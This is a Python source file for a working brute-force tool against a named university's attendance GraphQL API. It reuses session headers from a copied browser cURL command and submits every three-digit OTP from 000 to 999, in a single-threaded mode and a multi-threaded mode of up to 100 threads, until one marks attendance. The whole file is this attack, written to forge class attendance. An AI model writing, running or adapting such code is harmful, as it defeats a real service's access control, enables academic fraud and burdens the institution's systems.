import requests
import time
import json
from ui import font
import threading

import keyboard
import re
import os

# Default values (fallback)
DEFAULT_URL = 'https://attendix.apu.edu.my/graphql'
DEFAULT_HEADERS = {
    'accept': 'application/json, text/plain, */*',
    'content-type': 'application/json',
    'origin': 'https://apspace.apu.edu.my',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
}

URL = DEFAULT_URL
HEADERS = DEFAULT_HEADERS

def parse_curl(curl_str):
    """
    Basic parsing of a cURL string (Chrome/Edge 'Copy as cURL' format).
    Extracts URL and Headers.
    """
    url = None
    headers = {}
    
    # 1. Clean up newlines and backslashes for multi-line pastes
    curl_str = curl_str.replace('\\\n', ' ').replace('\n', ' ')
    
    # 2. Extract URL (quoted with ' or ")
    # Matches: curl "http..." or curl 'http...'
    url_match = re.search(r"curl\s+['\"]([^'\"]+)['\"]", curl_str)
    if url_match:
        url = url_match.group(1)
        
    # 3. Extract Headers (-H 'Key: Value' or --header "Key: Value")
    # Matches: -H "Key: Value" or -H 'Key: Value'
    # Use non-capturing group for flag, then capture content inside either '...' or "..."
    header_matches = re.finditer(r"(?:-H|--header)\s+(?:'([^']*)'|\"([^\"]*)\")", curl_str)
    
    for match in header_matches:
        # Group 1 is for single-quoted strings, Group 2 for double-quoted
        header_part = match.group(1) if match.group(1) is not None else match.group(2)
        
        if header_part and ':' in header_part:
            key, value = header_part.split(':', 1)
            headers[key.strip().lower()] = value.strip()
            
    return url, headers

def load_config():
    """Loads cURL config from Input/temp.txt if available"""
    global URL, HEADERS
    
    input_path = os.path.join(os.getcwd(), 'Input', 'temp.txt')
    
    if os.path.exists(input_path):
        try:
            with open(input_path, 'r', encoding='utf-8') as f:
                content = f.read().strip()
                if content:
                    parsed_url, parsed_headers = parse_curl(content)
                    
                    if parsed_url:
                        URL = parsed_url
                        print(font(f" [Config] Loaded URL: {URL}", color="green"))
                    
                    if parsed_headers:
                        HEADERS = parsed_headers
                        print(font(f" [Config] Loaded {len(HEADERS)} headers.", color="green"))
                    else:
                         print(font(" [Config] No headers found in file. Using defaults.", color="yellow"))

        except Exception as e:
            print(font(f" [Config] Error reading Input/temp.txt: {e}", color="red"))
    else:
        print(font(" [Config] Input/temp.txt not found. Using hardcoded defaults.", color="yellow"))

import concurrent.futures

def check_otp(otp):
    payload = {
        "operationName": "updateAttendance",
        "variables": {"otp": otp},
        "query": "mutation updateAttendance($otp: String!) {\n  updateAttendance(otp: $otp) {\n    id\n    attendance\n    classcode\n    date\n    startTime\n    endTime\n    classType\n    __typename\n  }\n}\n"
    }
    try:
        response = requests.post(URL, headers=HEADERS, json=payload)
        return response.json(), None
    except Exception as e:
        return None, e

def start():
    load_config()
    # Prompt for cooldown
    try:
        cooldown_input = input(" Enter cooldown in seconds (default 1.0): ")
        cooldown = float(cooldown_input) if cooldown_input.strip() else 1.0
    except ValueError:
        print(" Invalid input. Using default 1.0s.")
        cooldown = 1.0

    print(font(f"\n Starting Bruteforce Attack (Cooldown: {cooldown}s)...", color="yellow", inverse=True))
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=1) as executor:
        for i in range(1000):
            if keyboard.is_pressed('q') or keyboard.is_pressed('esc'):
                print(font("\n [!] Process Cancelled ", color="yellow", inverse=True))
                time.sleep(2)
                return

            otp = f"{i:03d}"
            
            # Submit the request to a separate thread
            future = executor.submit(check_otp, otp)

            # Wait for completion or interrupt
            while not future.done():
                if keyboard.is_pressed('q') or keyboard.is_pressed('esc'):
                    print(font("\n [!] Process Cancelled ", color="yellow", inverse=True))
                    # We cannot kill the thread, but we return immediately.
                    # The thread will finish in background but output is ignored.
                    time.sleep(2)
                    return
                time.sleep(0.05)

            # Process result
            response_json, error = future.result()

            if error:
                print(font(f" [ERROR] Request failed for {otp}: {error}", color="red"))
            else:
                # Check for success
                if 'data' in response_json and response_json['data'] and response_json['data'].get('updateAttendance'):
                    print(font(f" [SUCCESS] OTP Found: {otp} ", color="green", inverse=True))
                    # Optional: print details
                    # print(json.dumps(response_json['data'], indent=2))
                    break 

                # Check for errors
                elif 'errors' in response_json:
                    error_msg = response_json['errors'][0]['message']
                    if "You are not registered to this class" in error_msg:
                         print(f" [FAILED] {otp} - Not Result")
                    else:
                         print(f" [FAILED] {otp} - {error_msg}")
                
                else:
                    print(f" [FAILED] {otp} (Unknown response)")

            # Smart sleep to allow interrupt during cooldown
            slept = 0
            while slept < cooldown:
                if keyboard.is_pressed('q') or keyboard.is_pressed('esc'):
                    print(font("\n [!] Process Cancelled ", color="yellow", inverse=True))
                    time.sleep(2)
                    return
                time.sleep(0.05)
                slept += 0.05

    print(font("\n Bruteforce Complete.", color="cyan", inverse=True))
    input(" Press Enter to return to menu...")

def start_experimental():
    load_config()
    """Multi-threaded experimental bruteforce mode"""
    
    # Prompt for thread count
    try:
        thread_input = input(" Enter number of threads (default 4, max 100): ")
        num_threads = int(thread_input) if thread_input.strip() else 4
        if num_threads < 1 or num_threads > 100:
            print(" Invalid thread count. Using default 4.")
            num_threads = 4
    except ValueError:
        print(" Invalid input. Using default 4 threads.")
        num_threads = 4
    
    # Prompt for per-thread cooldown
    try:
        cooldown_input = input(" Enter per-thread cooldown in seconds (default 0.5): ")
        cooldown = float(cooldown_input) if cooldown_input.strip() else 0.5
    except ValueError:
        print(" Invalid input. Using default 0.5s.")
        cooldown = 0.5
    
    print(font(f"\n Starting Experimental Multi-Threaded Attack ", color="yellow", inverse=True))
    print(font(f" Threads: {num_threads} | Cooldown: {cooldown}s/thread ", color="cyan", inverse=True))
    print(font("\n [!] WARNING: High thread counts may trigger rate limiting! ", color="red", inverse=True))
    
    # Shared state
    stop_event = threading.Event()  # Signal to stop all threads
    success_event = threading.Event()  # Signal that OTP was found
    print_lock = threading.Lock()  # For thread-safe printing
    found_otp = [None]  # Use list to allow modification in closure
    
    def worker_thread(thread_id, start_range, end_range):
        """Worker thread to check a range of OTPs"""
        for i in range(start_range, end_range):
            # Check if we should stop
            if stop_event.is_set() or success_event.is_set():
                with print_lock:
                    print(font(f" [Thread {thread_id}] Stopped", color="yellow"))
                return
            
            otp = f"{i:03d}"
            
            # Make request
            response_json, error = check_otp(otp)
            
            if error:
                with print_lock:
                    print(font(f" [Thread {thread_id}] [ERROR] {otp}: {error}", color="red"))
            else:
                # Check for success
                if 'data' in response_json and response_json['data'] and response_json['data'].get('updateAttendance'):
                    with print_lock:
                        print(font(f"\n [Thread {thread_id}] [SUCCESS] OTP Found: {otp} ", color="green", inverse=True))
                        found_otp[0] = otp
                    success_event.set()  # Signal all threads to stop
                    return
                
                # Check for errors
                elif 'errors' in response_json:
                    error_msg = response_json['errors'][0]['message']
                    with print_lock:
                        if "You are not registered to this class" in error_msg:
                            print(f" [Thread {thread_id}] [FAILED] {otp} - Not Result")
                        else:
                            print(f" [Thread {thread_id}] [FAILED] {otp} - {error_msg}")
                else:
                    with print_lock:
                        print(f" [Thread {thread_id}] [FAILED] {otp} (Unknown response)")
            
            # Cooldown for this thread
            slept = 0
            while slept < cooldown:
                if stop_event.is_set() or success_event.is_set():
                    return
                time.sleep(0.05)
                slept += 0.05
        
        with print_lock:
            print(font(f" [Thread {thread_id}] Completed range {start_range:03d}-{end_range-1:03d}", color="cyan"))
    
    # Calculate ranges for each thread
    total_range = 1000  # 000-999
    chunk_size = total_range // num_threads
    threads = []
    
    for i in range(num_threads):
        start = i * chunk_size
        # Last thread gets any remainder
        end = (i + 1) * chunk_size if i < num_threads - 1 else total_range
        
        thread = threading.Thread(target=worker_thread, args=(i+1, start, end))
        thread.daemon = True
        threads.append(thread)
    
    # Start all threads
    print(font("\n Starting threads...\n", color="cyan"))
    for thread in threads:
        thread.start()
    
    # Monitor for user cancellation
    try:
        while any(t.is_alive() for t in threads):
            if keyboard.is_pressed('q') or keyboard.is_pressed('esc'):
                print(font("\n\n [!] User Cancellation Requested ", color="yellow", inverse=True))
                stop_event.set()
                break
            time.sleep(0.1)
    except KeyboardInterrupt:
        print(font("\n\n [!] Keyboard Interrupt ", color="yellow", inverse=True))
        stop_event.set()
    
    # Wait for all threads to finish
    print(font("\n Waiting for threads to finish...", color="cyan"))
    for thread in threads:
        thread.join(timeout=2.0)
    
    # Final results
    if found_otp[0]:
        print(font(f"\n [FINAL RESULT] OTP Found: {found_otp[0]} ", color="green", inverse=True))
    elif stop_event.is_set():
        print(font("\n Attack Cancelled.", color="yellow", inverse=True))
    else:
        print(font("\n Attack Complete. No valid OTP found.", color="cyan", inverse=True))
    
    input("\n Press Enter to return to menu...")

def test_connection():
    load_config()
    print(font("\n Testing Connection...", color="yellow", inverse=True))
    
    otp = input(" Enter OTP to test (3 digits): ")
    if not otp: otp = "000"

    payload = {
        "operationName": "updateAttendance",
        "variables": {"otp": otp},
        "query": "mutation updateAttendance($otp: String!) {\n  updateAttendance(otp: $otp) {\n    id\n    attendance\n    classcode\n    date\n    startTime\n    endTime\n    classType\n    __typename\n  }\n}\n"
    }

    try:
        start_time = time.time()
        response = requests.post(URL, headers=HEADERS, json=payload)
        elapsed = time.time() - start_time
        
        print(font(f"\n [STATUS] HTTP {response.status_code}", color="cyan" if response.status_code == 200 else "red"))
        print(f" Time: {elapsed:.2f}s")
        
        print("\n [HEADERS]")
        for k, v in response.headers.items():
            print(f" {k}: {v}")
            
        print("\n [BODY]")
        try:
            response_json = response.json()
            print(json.dumps(response_json, indent=2))

            print("\n [RESULT]")
            if 'data' in response_json and response_json['data'] and response_json['data'].get('updateAttendance'):
                print(font(f" [SUCCESS] OTP Valid: {otp}", color="green", inverse=True))
            elif 'errors' in response_json:
                error_msg = response_json['errors'][0]['message']
                if "You are not registered to this class" in error_msg:
                     print(font(f" [FAILED] {otp} - Not Result", color="red"))
                else:
                     print(font(f" [FAILED] {otp} - {error_msg}", color="red"))
            else:
                print(font(f" [FAILED] {otp} (Unknown response)", color="red"))

        except:
            print(response.text)
            print(font(f"\n [FAILED] Could not parse JSON response.", color="red"))
            
    except Exception as e:
        print(font(f"\n [ERROR] Connection failed: {e}", color="red"))

    input("\n Press Enter to return to menu...")
